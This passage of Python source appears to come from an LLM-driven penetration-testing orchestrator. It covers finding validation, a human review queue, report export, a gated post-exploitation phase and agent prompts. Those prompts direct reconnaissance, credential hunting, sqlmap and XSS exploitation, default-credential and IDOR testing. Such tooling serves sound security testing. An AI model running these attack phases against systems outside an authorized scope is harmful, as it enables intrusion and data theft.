                    chains = correlator.correlate(self.ctx.vulnerabilities)
                    if chains:
                        summary = correlator.get_summary()
                        logger.info(f"[Correlation] {summary['total_chains']} attack chains: "
                                    f"{summary['critical_chains']} critical, {summary['high_chains']} high")
                        for chain in chains[:5]:
                            logger.info(f"  Chain: {chain.name} (severity={chain.severity}, likelihood={chain.likelihood:.0%})")
                            for step in chain.steps:
                                logger.info(f"    {step}")
                        chain_findings = correlator.get_findings()
                        for cf in chain_findings:
                            self.ctx.add_vulnerability(cf)
                        self.ctx.update('attack_chains', summary)
                    else:
                        logger.info("[Correlation] No attack chains identified")
                except Exception as e:
                    logger.warning(f"[Correlation] Finding correlation failed (non-fatal): {e}")

            if self.ctx.vulnerabilities:
                from core.reporting.retest_engine import RetestEngine
                retest_engine = RetestEngine(auth_headers=getattr(self.ctx, "auth_headers", None))
                await retest_engine.retest_findings(self.ctx.vulnerabilities)
                confirmed = sum(1 for v in self.ctx.vulnerabilities if v.get("reproducibility_status") == "CONFIRMED")
                self._log_activity("retest", f"Retested {len(self.ctx.vulnerabilities)} findings — {confirmed} confirmed",
                                   detail=f"RetestEngine: {confirmed}/{len(self.ctx.vulnerabilities)} reproduced",
                                   tool="retest_engine",
                                   output_data=f"Confirmed: {confirmed}, Total: {len(self.ctx.vulnerabilities)}")

                # P1.5: evidence-gated attack-path correlation over CONFIRMED
                # findings only (post-retest). Strict mode links steps only when
                # a real evidence dependency exists — never merges unrelated
                # findings. Kept separate from the permissive narrative pass above.
                try:
                    from core.analysis.correlation_engine import CorrelationEngine as _CE
                    _ce = _CE()
                    _paths = _ce.correlate(self.ctx.vulnerabilities,
                                           confirmed_only=True,
                                           require_evidence_link=True)
                    if _paths:
                        self.ctx.update('attack_paths', _ce.get_summary())
                        logger.info(f"ATTACK_PATHS_CONFIRMED: {len(_paths)} evidence-linked "
                                    "chain(s) over confirmed findings")
                        for _p in _paths[:5]:
                            logger.info(f"  AttackPath: {_p.name} sev={_p.severity} "
                                        f"confirmed={_p.confirmed} evidence_link={_p.evidence_link}")
                except Exception as _pe_err:
                    logger.debug(f"attack-path correlation skipped: {_pe_err}")

            # Adversarial Critic (Planner–Worker–Critic loop) — semantic second
            # opinion that challenges each surviving finding and quarantines the
            # confidently-rejected ones before they reach the report.
            from core.common.config import get_config as _get_cfg
            if self.ctx.vulnerabilities and _get_cfg().get_bool("CRITIC_ENABLED", True):
                try:
                    from core.verification.critic_agent import CriticAgent
                    critic = CriticAgent(
                        llm_client=self.llm,
                        max_concurrency=_get_cfg().get_int("CRITIC_CONCURRENCY", 4),
                    )
                    # Keep a reference to the full annotated set (survivors +
                    # quarantined) so the reward policy learns from both.
                    annotated = list(self.ctx.vulnerabilities)
                    critic_summary = await critic.verify_findings(
                        self.ctx.vulnerabilities, quarantine=True
                    )
                    self.ctx.vulnerabilities = critic_summary["findings"]
                    logger.info(
                        f"[Critic] confirmed={critic_summary['confirmed']} "
                        f"false_positive={critic_summary['false_positive']} "
                        f"uncertain={critic_summary['uncertain']} "
                        f"quarantined={critic_summary['quarantined']}"
                    )
                    self._log_activity("critic",
                        f"Critic verified findings: {critic_summary['confirmed']} confirmed, "
                        f"{critic_summary['quarantined']} quarantined",
                        tool="critic_agent",
                        output_data=json.dumps({k: v for k, v in critic_summary.items() if k != "findings"}, default=str))
                    self.ctx.critic_summary = {
                        k: v for k, v in critic_summary.items() if k != "findings"
                    }
                    # Feed the closed-loop reward policy (self-improvement).
                    try:
                        self._record_critic_outcomes(annotated)
                    except Exception as _re:
                        logger.debug(f"[RewardPolicy] recording skipped: {_re}")
                except Exception as e:
                    logger.warning(f"[Critic] Adversarial verification failed (non-fatal): {e}")

            # LLM-Powered Finding Validation — confidence scoring & false positive detection
            if self.ctx.vulnerabilities:
                try:
                    from core.reporting.llm_validator import LLMFindingValidator
                    validator = LLMFindingValidator(max_concurrent=3)
                    self.ctx.vulnerabilities = await validator.validate_findings(
                        self.ctx.vulnerabilities, max_findings=50
                    )
                    summary = validator.get_summary()
                    logger.info(f"[LLMValidator] {summary['validated']} validated, "
                                f"{summary['false_positives']} FPs removed, "
                                f"{summary['severity_adjustments']} severity adjustments")
                    self._log_activity("critic",
                        f"LLM Validator: {summary['validated']} validated, {summary['false_positives']} FPs removed",
                        tool="llm_validator",
                        output_data=json.dumps(summary, default=str))
                    # Filter out false positives
                    self.ctx.vulnerabilities = [
                        v for v in self.ctx.vulnerabilities
                        if v.get("status") != "FALSE_POSITIVE"
                    ]
                except Exception as e:
                    logger.warning(f"[LLMValidator] Validation failed (non-fatal): {e}")

            # Strix Pattern #4: Auto-calculate confidence scores
            if self.ctx.vulnerabilities:
                try:
                    from core.scoring.confidence_scorer import ResponseSample
                    for v in self.ctx.vulnerabilities:
                        proof = str(v.get("proof", "") or v.get("evidence", "") or "")
                        payload = str(v.get("payload", "") or "")
                        severity = str(v.get("severity", "medium")).lower()

                        ev_type = self.confidence_scorer.classify_evidence_type(proof, payload)
                        samples = [ResponseSample(
                            status_code=v.get("status_code", 200),
                            response_length=len(proof),
                            response_time_ms=v.get("response_time_ms", 0) or 0,
                            contains_error="error" in proof.lower() or "syntax" in proof.lower(),
                            payload_used=payload,
                        )]
                        conf_result = self.confidence_scorer.score(
                            samples=samples,
                            evidence_type=ev_type,
                            severity=severity,
                            payload=payload,
                            counterevidence=str(v.get("counterevidence", "") or ""),
                        )
                        v["confidence_score"] = conf_result.score_pct
                        v["confidence_level"] = conf_result.level.value
                        v["confidence_rationale"] = conf_result.rationale
                        v["auto_reportable"] = conf_result.is_reportable
                        v["needs_review"] = conf_result.needs_review

                    reportable, needs_review, rejected = self.confidence_scorer.gate_findings(
                        self.ctx.vulnerabilities
                    )
                    logger.info(
                        f"[ConfidenceScorer] reportable={len(reportable)} "
                        f"needs_review={len(needs_review)} rejected={len(rejected)}"
                    )
                    self._log_activity("confidence_scoring",
                        f"Auto-scored {len(self.ctx.vulnerabilities)} findings: "
                        f"{len(reportable)} reportable, {len(needs_review)} review, {len(rejected)} rejected",
                        tool="confidence_scorer")

                    # Enforce confidence gate: keep only reportable + needs_review
                    if rejected:
                        logger.info(f"[ConfidenceGate] Removing {len(rejected)} rejected findings from vulnerabilities")
                        rejected_ids = {id(r) for r in rejected}
                        self.ctx.vulnerabilities = [
                            v for v in self.ctx.vulnerabilities if id(v) not in rejected_ids
                        ]
                except Exception as cs_err:
                    logger.warning(f"[ConfidenceScorer] Scoring failed (non-fatal): {cs_err}")

            # Persist final validated vulnerabilities back to DB so the stored data
            # reflects post-retest/critic/validator filtering (not stale pre-validation state).
            try:
                await self._persist_vulnerabilities()
                logger.info(f"[Persist] Final validated findings persisted: {len(self.ctx.vulnerabilities)}")
            except Exception as e:
                logger.warning(f"[Persist] Final vulnerability persist failed (non-fatal): {e}")

            # Populate Review Queue — feed confirmed findings + exploit results so
            # the human operator sees what the agent did, what it found, and what needs
            # manual follow-up.
            try:
                from core.reporting.review_queue import get_review_queue, STATUS_SUCCESS, STATUS_NEEDS_MANUAL, STATUS_PARTIAL
                rq = get_review_queue()
                scan_id = self._scan_id
                for v in self.ctx.vulnerabilities:
                    sev = str(v.get("severity", "info")).upper()
                    status = v.get("status", "")
                    critic_verdict = (v.get("critic", {}) or {}).get("verdict", "")
                    retest_status = v.get("reproducibility_status", "")
                    title = v.get("title") or v.get("type", "Unknown Finding")
                    target = v.get("target") or v.get("location") or self.ctx.target

                    if v.get("exploited") or v.get("confirmed") or sev in ("CRITICAL", "HIGH"):
                        q_status = STATUS_SUCCESS
                    elif status == "QUARANTINED" or critic_verdict == "FALSE_POSITIVE":
                        continue
                    elif retest_status == "NOT REPRODUCIBLE":
                        q_status = STATUS_NEEDS_MANUAL
                    else:
                        q_status = STATUS_PARTIAL

                    evidence = str(v.get("proof") or v.get("evidence") or v.get("details") or "")[:1500]
                    tried = f"Retest: {v.get('retest_successes', '?')}/{v.get('retest_attempts', '?')} succeeded"
                    if critic_verdict:
                        tried += f" | Critic: {critic_verdict}"
                    if v.get("source") or v.get("source_agent") or v.get("tool"):
                        tried += f" | Source: {v.get('source') or v.get('source_agent') or v.get('tool')}"

                    history = []
                    if v.get("source") or v.get("tool"):
                        history.append({"step": "Discovery", "tool": v.get("source") or v.get("tool", ""),
                                        "result": v.get("type", "")})
                    history.append({"step": "Retest", "attempts": v.get("retest_attempts", 0),
                                    "successes": v.get("retest_successes", 0),
                                    "status": retest_status or "N/A"})
                    if critic_verdict:
                        critic_data = v.get("critic", {}) or {}
                        history.append({"step": "Critic Review", "verdict": critic_verdict,
                                        "confidence": critic_data.get("confidence", 0),
                                        "reasoning": critic_data.get("reasoning", "")[:300]})
                    if v.get("payload"):
                        history.append({"step": "Payload", "data": str(v.get("payload"))[:500]})

                    manual_guidance = ""
                    if q_status == STATUS_NEEDS_MANUAL:
                        manual_guidance = (
                            f"The agent found this {v.get('type', 'issue')} but could not fully "
                            f"reproduce it ({v.get('retest_successes', 0)}/{v.get('retest_attempts', 0)} "
                            f"attempts). Try manually testing {target} with the payload/evidence shown."
                        )

                    rq.record(
                        target=target,
                        title=title,
                        status=q_status,
                        category=v.get("type", ""),
                        severity=sev,
                        evidence=evidence,
                        tried_summary=tried,
                        manual_guidance=manual_guidance,
                        history=history,
                        scan_id=scan_id,
                    )

                for ex in self.ctx.exploit_results:
                    ex_title = ex.get("title") or ex.get("vuln_id") or ex.get("type", "Exploit")
                    ex_target = ex.get("target") or self.ctx.target
                    ex_status = STATUS_SUCCESS if ex.get("success") else STATUS_NEEDS_MANUAL
                    rq.record(
                        target=ex_target,
                        title=f"Exploit: {ex_title}",
                        status=ex_status,
                        category=ex.get("type", "exploit"),
                        severity="HIGH",
                        evidence=str(ex.get("proof") or ex.get("error") or "")[:1500],
                        tried_summary=f"Tool: {ex.get('tool', '?')} | Chain: {ex.get('chain_id', 'N/A')}",
                        scan_id=scan_id,
                    )
                logger.info(f"[ReviewQueue] Populated with {len(self.ctx.vulnerabilities)} findings + "
                            f"{len(self.ctx.exploit_results)} exploit results")
            except Exception as e:
                logger.warning(f"[ReviewQueue] Population failed (non-fatal): {e}")

            # Artifact-writing hooks are gated by REPORTS_ENABLED (default off).
            from core.common.reports_config import reports_enabled as _reports_enabled, reports_dir as _reports_dir
            _reports_on = _reports_enabled()
            _rdir = _reports_dir() if _reports_on else None

            # Artifacts always persist to Postgres (scan_artifacts). When
            # REPORTS_ENABLED=1 they also write to disk in reports/.
            _sid = getattr(self, "_scan_id", None) or getattr(self.ctx, "scan_id", None)

            # Evidence Screenshot Capture — screenshot vulnerable pages as proof
            if self.ctx.vulnerabilities:
                try:
                    from core.evidence.screenshot_capture import ScreenshotCapture
                    screenshotter = ScreenshotCapture(
                        output_dir=str(_rdir / "evidence") if _reports_on else None,
                        scan_id=_sid)
                    screenshotter.capture_findings(self.ctx.vulnerabilities, max_screenshots=20)
                    ev_summary = screenshotter.get_evidence_summary()
                    logger.info(f"[Screenshots] {ev_summary['successful']}/{ev_summary['total_attempted']} captured")
                except Exception as e:
                    logger.warning(f"[Screenshots] Capture failed (non-fatal): {e}")

            # Custom Nuclei Template Generation — create templates from discovered patterns
            if self.ctx.vulnerabilities:
                try:
                    from core.tools.nuclei_template_gen import NucleiTemplateGenerator
                    template_gen = NucleiTemplateGenerator(
                        output_dir=str(_rdir / "custom_templates") if _reports_on else None,
                        scan_id=_sid)
                    generated = template_gen.generate_all(self.ctx.vulnerabilities, max_templates=50)
                    if generated:
                        logger.info(f"[TemplateGen] Generated {len(generated)} custom nuclei templates")
                except Exception as e:
                    logger.warning(f"[TemplateGen] Generation failed (non-fatal): {e}")

            # SARIF Export — always persist to DB; also to disk when enabled
            if self.ctx.vulnerabilities:
                try:
                    from core.reporting.sarif_export import SARIFExporter
                    sarif_exporter = SARIFExporter()
                    sarif_json = sarif_exporter.build(
                        self.ctx.vulnerabilities, target=self.ctx.target) \
                        if hasattr(sarif_exporter, "build") else None
                    if _reports_on:
                        sarif_path = str(_rdir / "findings.sarif")
                        sarif_exporter.export(self.ctx.vulnerabilities,
                                              target=self.ctx.target,
                                              output_path=sarif_path)
                        logger.info(f"[SARIF] Exported {len(self.ctx.vulnerabilities)} findings to {sarif_path}")
                    if _sid and sarif_json is not None:
                        from core.database.pg_store import ScanArtifactRepo
                        ScanArtifactRepo.insert(
                            _sid, "sarif", "findings.sarif",
                            json.dumps(sarif_json, indent=2, default=str)
                                if not isinstance(sarif_json, str) else sarif_json,
                            mime_type="application/sarif+json",
                            metadata={"vuln_count": len(self.ctx.vulnerabilities)})
                        logger.info(f"[SARIF] Persisted to Postgres for scan {_sid}")
                except Exception as e:
                    logger.warning(f"[SARIF] Export failed (non-fatal): {e}")

            # Audit log for reporting phase
            try:
                self.execution_auditor.log_action(
                    "REPORT_GENERATION",
                    {"target": self.ctx.target, "vuln_count": len(self.ctx.vulnerabilities)},
                )
            except Exception:
                pass

            await self._generate_report()
            self._log_activity("phase", "Report generated",
                               detail=f"Final report with {len(self.ctx.vulnerabilities)} findings, "
                                      f"{len(self.ctx.exploit_results)} exploit results")

            # Continuous ASM — snapshot the attack surface and diff against the
            # previous run so scheduled re-scans surface only what changed.
            from core.common.config import get_config as _get_cfg_asm
            if _get_cfg_asm().get_bool("ASM_MONITOR_ENABLED", True):
                try:
                    from core.monitoring.asm_monitor import ASMMonitor
                    delta = await ASMMonitor().record_and_diff(self.ctx)
                    self.ctx.asm_delta = delta.to_dict()
                except Exception as e:
                    logger.warning(f"[ASM] snapshot/diff failed (non-fatal): {e}")

            # ── V2 Hook: Final sync + generate coverage analysis report ──
            try:
                self._sync_v1_findings_to_coverage_matrix()
                coverage_text = self._generate_coverage_report()
                logger.info(f"[V2CoverageReport]\n{coverage_text}")
                self.ctx.update('coverage_report_v2', coverage_text)

                report_obj = CoverageReport(
                    coverage_matrix=self.coverage_matrix,
                    finding_store=self.finding_store_v2,
                    knowledge_graph=self.knowledge_graph,
                    test_category_map={t.test_id: t.attack_type for t in self.test_catalog_v2.list_all()},
                )
                json_report = report_obj.generate_json()
                self.ctx.update('coverage_json_v2', json_report)
                logger.info(f"[V2Report] coverage={json_report['overall_coverage']:.1%} "
                            f"converged={json_report['converged']} "
                            f"findings={json_report['total_findings']} "
                            f"confirmed={json_report['confirmed_findings']}")

                attack_paths = self.knowledge_graph.get_attack_paths()
                if attack_paths:
                    logger.info(f"[KnowledgeGraph] {len(attack_paths)} validated attack paths")
            except Exception as e:
                logger.warning(f"[V2CoverageReport] Failed (non-fatal): {e}")

            # ── V2 Hook: Canonical reporter output ──
            try:
                self.canonical_reporter._surface = getattr(self.ctx, 'attack_surface', None)
                all_findings = self.ctx.vulnerabilities if hasattr(self.ctx, 'vulnerabilities') else []
                self.canonical_reporter._findings = [
                    f if isinstance(f, dict) else getattr(f, '__dict__', {})
                    for f in all_findings
                ]
                # Canonical summary → DB (always) and disk (when enabled)
                canonical_path = self.canonical_reporter.save_json(
                    str(_rdir / "canonical_summary.json") if _reports_on else None,
                    scan_id=_sid)
                if canonical_path:
                    logger.info(f"[CanonicalReporter] Saved to {canonical_path}")
                canonical_md = self.canonical_reporter.generate_markdown()
                self.ctx.update('canonical_report_md', canonical_md)
                if _sid and canonical_md:
                    try:
                        from core.database.pg_store import ScanArtifactRepo
                        ScanArtifactRepo.insert(
                            _sid, "canonical_markdown", "canonical_summary.md",
                            canonical_md, mime_type="text/markdown")
                    except Exception as _e:
                        logger.debug(f"[CanonicalReporter] MD persist failed: {_e}")

                # Strix Pattern #2: Persist coverage tracker report
                if _reports_on:
                    try:
                        self.coverage_tracker.persist(str(_rdir / "coverage_tracker.json"))
                    except Exception as ct_e:
                        logger.debug(f"[CoverageTracker] Persist failed: {ct_e}")
                try:
                    ct_report = self.coverage_tracker.generate_report()
                    self.ctx.update('coverage_tracker_report', ct_report)
                    logger.info(f"[CoverageTracker] {ct_report.get('coverage', {}).get('honest_summary', '')}")
                except Exception as ct_e:
                    logger.debug(f"[CoverageTracker] Report failed: {ct_e}")

                # Strix Pattern #3: Log and persist retry stats
                try:
                    retry_stats = self.retry_executor.stats
                    logger.info(f"[RetryExecutor] Stats: {retry_stats}")
                    self.ctx.update('retry_stats', retry_stats)
                    if _reports_on:
                        import json as _json
                        retry_path = _rdir / "retry_stats.json"
                        retry_path.parent.mkdir(parents=True, exist_ok=True)
                        retry_path.write_text(_json.dumps(retry_stats, default=str), encoding="utf-8")
                except Exception:
                    pass
            except Exception as e:
                logger.warning(f"[CanonicalReporter] Report generation failed (non-fatal): {e}")

            # ── V2 Hook: Identity coverage summary ──
            try:
                if hasattr(self.identity_coverage, 'summary'):
                    ic_summary = self.identity_coverage.summary()
                    self.ctx.update('identity_coverage_summary', ic_summary)
                    logger.info(f"[IdentityCoverage] Summary: {ic_summary}")
            except Exception as e:
                logger.debug(f"[IdentityCoverage] Summary skipped: {e}")

            # ── V2 Hook: Structured learning summary ──
            try:
                if hasattr(self.structured_learning, 'summary'):
                    learn_summary = self.structured_learning.summary()
                    self.ctx.update('learning_summary', learn_summary)
                    logger.info(f"[StructuredLearning] Summary: {learn_summary}")
            except Exception as e:
                logger.debug(f"[StructuredLearning] Summary skipped: {e}")

            # ── V2 Hook: Convergence final evaluation ──
            try:
                conv_status = self.convergence_engine.evaluate(
                    remaining_tests=len(self.coverage_matrix.get_gaps()) if hasattr(self, 'coverage_matrix') and self.coverage_matrix else 0,
                    blocked_tests=len(self.coverage_matrix.get_blocked()) if hasattr(self, 'coverage_matrix') and self.coverage_matrix else 0,
                    budget_exhausted=getattr(self.budget_governor, 'is_exhausted', lambda: False)() if hasattr(self, 'budget_governor') else False,
                    target_paused=getattr(self.target_health_manager, 'state', '') == 'PAUSED',
                )
                self.ctx.update('convergence_status', {
                    'is_converged': conv_status.is_converged,
                    'reason': conv_status.reason,
                    'coverage_pct': conv_status.coverage_pct,
                })
                logger.info(f"[Convergence] Final: converged={conv_status.is_converged} reason={conv_status.reason}")
            except Exception as e:
                logger.debug(f"[Convergence] Final evaluation skipped: {e}")

            # Save secure checkpoint after reporting
            try:
                v2_conv = 0.0
                try:
                    v2_conv = self.convergence_engine.calculate_convergence()
                except Exception:
                    pass
                self.secure_checkpoint.save_checkpoint({
                    "target": self.ctx.target,
                    "phase": "REPORTING_COMPLETE",
                    "vuln_count": len(self.ctx.vulnerabilities),
                    "exploit_count": len(self.ctx.exploit_results),
                    "convergence": self.convergence_engine.calculate_convergence(),
                    "v2_coverage": v2_conv,
                    "v2_findings": len(self.finding_store_v2.list_all()),
                    "v2_gaps": len(self.coverage_matrix.get_gaps()),
                })
            except Exception as e:
                logger.warning(f"[SecureCheckpoint] Save failed (non-fatal): {e}")

    async def _capture_requests(self):
        target = self.ctx.target
        if not str(target).lower().startswith(("http://", "https://")):
            logger.info("[capture] target is not an http(s) URL — skipping capture")
            return
        logger.info("\n>>> PHASE 1b: HTTP REQUEST INTERCEPTION")
        try:
            capturer = RequestCapturer(max_pages=12, max_depth=2)
            result = await asyncio.to_thread(capturer.capture, target)
            if result.error and not result.requests:
                # P1.9: distinguish a BROWSER-UNAVAILABLE failure (no Chromium /
                # playwright) from a page that genuinely made no client-side
                # requests. The former must not be read as negative evidence.
                err = str(result.error or "").lower()
                browser_markers = ("playwright", "chromium", "executable doesn't exist",
                                    "browser launch", "playwright install", "no browser")
                if any(m in err for m in browser_markers):
                    self.ctx.browser_status = "UNAVAILABLE"
                    self.ctx.browser_status_reason = str(result.error)[:200]
                    logger.warning(f"[capture] BROWSER_UNAVAILABLE: {result.error} — "
                                   "client-side tests will be marked UNAVAILABLE, not negative")
                else:
                    logger.warning(f"[capture] no requests captured: {result.error}")
                return
            self.ctx.browser_status = "AVAILABLE"
            capturer.store(result, self.ctx)
            self.metrics.record_event(
                "tool", "request_capture",
                bool(result.requests),
                f"{len(result.pages)} pages, {len(result.requests)} requests")
            logger.info(f"[capture] stored {len(self.ctx.captured_requests)} "
                        f"requests across {len(self.ctx.crawled_pages)} pages")
        except Exception as e:      # noqa: BLE001
            logger.error(f"[capture] request interception failed: {e}")

    async def _run_post_exploitation(self):
        logger.info("\n>>> PHASE 6: POST-EXPLOITATION (privesc / lateral / persistence)")

        def should_skip_postex():
            has_rce = self.ctx.has_shell_access
            has_creds = len(self.ctx.harvested_creds) > 0
            has_exploitable_logic = any(
                v.get("type", "").lower() in ("business_logic", "idor", "auth_bypass") 
                for v in self.ctx.vulnerabilities
            )
            
            # Skip ONLY if truly nothing to work with
            if has_rce or has_creds or has_exploitable_logic:
                return False
            return True

        if should_skip_postex():
            logger.info("No shell/RCE foothold, credentials, or logic vulnerabilities established — skipping post-exploitation")
            return

        # Runner stays None (plan-only) unless a confirmed foothold session is
        # wired in. Persistence install additionally requires DEEP + authorize.
        runner = None
        authorize_persistence = False  # never auto-install; operator opt-in only

        self.post_exploit = PostExploitManager(
            self.ctx, tier=self.tier,
            runner=runner, authorize_persistence=authorize_persistence,
        )
        try:
            result = await self.post_exploit.run()
            if result.get("status") == "completed":
                pv = result["privesc"]; lat = result["lateral"]
                logger.info(
                    f"Post-exploitation: {pv['count']} privesc paths, "
                    f"{lat['pivots']} pivots, {lat['credentials']} creds, "
                    f"{len(result['persistence']['installed'])} persistence installed "
                    f"(plan-only={self.tier != 'DEEP'}), "
                    f"{result['mitre']['techniques']} ATT&CK techniques"
                )
                rec = pv.get("recommended")
                if rec:
                    logger.info(f"Recommended escalation: {rec.get('technique')} — "
                                f"{rec.get('path','')}")
        except Exception as e:      # noqa: BLE001
            logger.error(f"Post-exploitation phase failed: {e}")

    async def _parse_authorization(self, auth_doc: str):
        logger.info("Parsing authorization document...")
        self.ctx.log_brain("Parsing authorization document", "parse_auth")

        result = await self.llm.generate_json(
            f"Parse this authorization document and extract:\n"
            f"- domains: list of authorized domains\n"
            f"- max_tier: POC, SHALLOW, or DEEP\n"
            f"- restrictions: any restrictions mentioned\n"
            f"- valid_until: expiration date if mentioned\n\n"
            f"Document:\n{auth_doc[:3000]}\n\n"
            f"Return JSON: {{\"domains\": [...], \"max_tier\": \"...\", "
            f"\"restrictions\": [...], \"valid_until\": \"...\"}}",
            tier=TaskTier.SMALL,
        )

        if result and result.get("domains"):
            self.ctx.scope = result
            self.auth.scope = AuthorizationManager.create_scope(
                domains=result["domains"],
                max_tier=result.get("max_tier", "POC"),
            )
            logger.info(f"Scope: {result['domains']}, tier: {result.get('max_tier')}")


    async def _run_phase(self, phase: str):
        try:
            await self._run_phase_agentic(phase)
        except Exception as e:
            logger.warning(f"Agentic executor failed: {e}, falling back to Approach A")
            if self.execution_config.should_use_mode_a_primary():
                try:
                    await self._run_phase_approach_a(phase)
                except Exception as e2:
                    logger.exception(f"Approach A failed: {e2}")
                    if self.execution_config.can_fallback_to_b():
                        logger.info("Falling back to Approach B...")
                        await self._run_phase_approach_b(phase)
            elif self.execution_config.should_use_mode_b_primary():
                await self._run_phase_approach_b(phase)
            else:
                await self._run_phase_legacy(phase)

    async def _run_phase_agentic(self, phase: str):
        logger.info(f"\n>>> AGENTIC EXECUTION: phase={phase}")

        from core.security.authorization import AuthContext
        allowed_tools = list(self.tools.tools.keys()) if hasattr(self, 'tools') and hasattr(self.tools, 'tools') else []
        auth_context = AuthContext(
            allowed_tools=allowed_tools,
            has_elevated_privilege=True,
            target_profile=getattr(self, 'target_profile', None),
        )

        phase_objectives = {
            "recon": (
                f"Perform comprehensive reconnaissance on {self.ctx.target}. "
                "1) Enumerate subdomains using multiple DNS tools (subfinder, amass, assetfinder). "
                "2) Fingerprint technologies (web server, framework, CMS, WAF). "
                "3) Scan ports to find open services. "
                "4) Crawl the application to discover endpoints and parameters. "
                "5) Filter out static assets (.js, .css, .png) and focus on actionable endpoints. "
                "Record every discovery with analyze_results."
            ),
            "OSINT_RECONNAISSANCE": (
                f"Perform OSINT reconnaissance on {self.ctx.target}. "
                "Look for: exposed employee info, GitHub repos, leaked credentials, "
                "DNS intelligence, WHOIS data, technology details. "
                "Use theharvester, whois, dig, and manual HTTP requests to gather intelligence."
            ),
            "DEEP_RECON": (
                f"Deep reconnaissance on {self.ctx.target}. "
                "1) Parameter discovery on known endpoints (arjun, paramspider). "
                "2) JavaScript analysis for hidden API routes and hardcoded secrets. "
                "3) Directory brute-forcing on interesting paths (ffuf, gobuster). "
                "4) TLS/SSL analysis for certificate issues and weak ciphers. "
                "Focus on endpoints most likely to have vulnerabilities."
            ),
            "analyze": (
                f"Active vulnerability scanning on {self.ctx.target}. "
                "1) Run nuclei with CVE, misconfig, and exposure tags. "
                "2) Run nikto for server misconfigurations. "
                "3) Test for SQL injection on parameterized endpoints using sqlmap. "
                "4) Check for XSS on input-accepting endpoints. "
                "5) Check security headers (CSP, CORS, X-Frame-Options, HSTS). "
                "Analyze each tool's output — if it reveals a new attack surface, investigate it."
            ),
            "ACTIVE_SCANNING": (
                f"Active vulnerability scanning on {self.ctx.target}. "
                "Same as analyze phase — use nuclei, nikto, sqlmap, and header checks."
            ),
            "exploit": (
                f"Exploit confirmed vulnerabilities on {self.ctx.target}. "
                "Review known vulnerabilities and attempt controlled exploitation: "
                "1) SQL injection: Use sqlmap with --batch --level=5 on injectable endpoints. "
                "2) XSS: Craft payloads and verify execution. "
                "3) Authentication bypass: Test default credentials, parameter manipulation. "
                "4) IDOR: Test object references with different user contexts. "
                "If exploitation fails, analyze the error and try alternative approaches. "
                "If you discover new vulnerabilities during exploitation, record and investigate them."
            ),
            "EXPLOITATION": (
                f"Same as exploit phase for {self.ctx.target}."
            ),
        }

        objective = phase_objectives.get(phase, f"Perform {phase} phase testing on {self.ctx.target}. Use available tools to find security issues.")

        context_hint = ""
        if self.ctx.vulnerabilities:
            vuln_summary = "\n".join(
                f"  - [{v.get('severity', 'info')}] {v.get('title', v.get('type', 'unknown'))}"
                for v in self.ctx.vulnerabilities[:15]
            )
            context_hint += f"Known vulnerabilities:\n{vuln_summary}\n\n"

        if self.ctx.subdomains:
            context_hint += f"Known subdomains: {', '.join(self.ctx.subdomains[:20])}\n\n"

        # P1-6: hand the LLM a normalized state summary instead of relying
        # on raw history. Bounded to <60 lines so it stays cheap. P1-4:
        # target-specific prioritized plan replaces the generic checklist.
        try:
            from core.knowledge.state_summary import build_state, render
            from core.adaptation.waf_state import get_waf_state
            from core.orchestration.target_plan import build_plan, render_plan, TargetSummary
            from core.intelligence.asset_classifier import AssetClass
            waf_mode = get_waf_state().mode_for(self.ctx.target).value
            state = build_state(
                self.ctx, waf_mode=waf_mode,
                observations=[v.get("title", "") for v in self.ctx.vulnerabilities[:20]],
                hypotheses={"open": [], "rejected": []},
                tools_executed=list(getattr(self.ctx, "tools_executed", []) or [])[:30],
                missing_evidence=[],
            )
            context_hint += "\n[NORMALIZED STATE]\n" + render(state) + "\n"
            asset_classes = getattr(self.ctx, "asset_classes", {}) or {}
            ac = "LIVE_APP"
            for _, cls in asset_classes.items():
                if cls == AssetClass.LIVE_APP.value:
                    ac = cls
                    break
            summary = TargetSummary(
                target=self.ctx.target, asset_class=ac,
                technologies=list(getattr(self.ctx, "technologies", []) or [])[:15],
                endpoints=list(getattr(self.ctx, "endpoints", []) or [])[:30],
                parameters=list(getattr(self.ctx, "parameters", []) or [])[:20],
                auth_state="authenticated" if getattr(self.ctx, "auth_session", None) else "anonymous",
                api_bases=[e for e in (getattr(self.ctx, "endpoints", []) or [])
                           if isinstance(e, str) and "/api" in e][:10],
            )
            plan = build_plan(summary)
            if plan:
                context_hint += "\n[TARGET-SPECIFIC PLAN]\n" + render_plan(plan) + "\n"
                # P2-2: seed the hypothesis engine with the plan items so
                # `next_best_action` can guide subsequent decisions.
                try:
                    from core.hypothesis.hypothesis_engine import get_engine, Hypothesis, HypothesisState
                    from core.observability.scan_metrics import get_metrics
                    eng = get_engine()
                    existing = {(h.vuln_class, h.endpoint) for h in eng.open_hypotheses()}
                    added = 0
                    for item in plan:
                        for tgt in (item.targets or [self.ctx.target])[:5]:
                            key = (item.vuln_class, tgt)
                            if key in existing:
                                continue
                            eng.add(Hypothesis(
                                vuln_class=item.vuln_class, target=self.ctx.target,
                                endpoint=tgt, rationale=item.rationale,
                                required_evidence=["tool_confirmation"],
                                priority={"P1": 0.9, "P2": 0.7, "P3": 0.5, "P4": 0.3}.get(item.priority, 0.5),
                                cost_estimate={"P1": 0.7, "P2": 1.0, "P3": 1.2, "P4": 2.0}.get(item.priority, 1.0),
                                state=HypothesisState.OPEN,
                            ))
                            added += 1
                    if added:
                        get_metrics().inc("hypotheses_generated", by=added)
                        logger.info(f"HYPOTHESIS_SEEDED: added={added}")
                except Exception:
                    pass
        except Exception as _e:
            logger.debug(f"normalized-state context skipped: {_e}")

        if phase in ("exploit", "EXPLOITATION"):
            failed_exploits = sum(1 for e in self.ctx.exploit_results if not e.get("success"))
            total_exploits = len(self.ctx.exploit_results)
            if total_exploits >= 5 and failed_exploits == total_exploits:
                logger.info(f"[AgenticPhase] Skipping {phase}: {failed_exploits}/{total_exploits} exploits failed, 0% success")
                return
            max_rounds = 12
        elif phase in ("analyze", "ACTIVE_SCANNING"):
            max_rounds = 15
        else:
            max_rounds = 12

        from agents.llm_harness_adapter import get_llm, initialize_llm
        llm_harness = get_llm()
        if llm_harness is None:
            try:
                await initialize_llm()
            except Exception as init_err:
                logger.error(f"[AgenticPhase] LLM initialization failed: {init_err}")
                raise RuntimeError(f"LLM harness init failed: {init_err}") from init_err
            llm_harness = get_llm()
            if llm_harness is None:
                raise RuntimeError("LLM harness is None after initialization")

        # Strix Pattern #1: Inject skills into agentic executor context
        try:
            phase_at_map = {
                "exploit": ["sql_injection", "xss_reflected", "idor", "authentication", "authorization"],
                "EXPLOITATION": ["sql_injection", "xss_reflected", "idor", "authentication"],
                "analyze": ["sql_injection", "xss_reflected"],
